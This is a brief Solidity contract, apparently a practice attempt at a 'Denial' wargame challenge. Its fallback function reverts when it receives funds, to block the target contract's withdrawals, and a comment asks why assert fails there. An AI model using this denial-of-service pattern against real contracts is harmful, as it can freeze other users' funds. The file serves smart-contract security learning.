// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";
import "hardhat/console.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }
    
    fallback() external payable {
        console.log("In fallback");
        // Why doesn't assert work here?
        // assert(false);        
        revert("Test");
    }
}
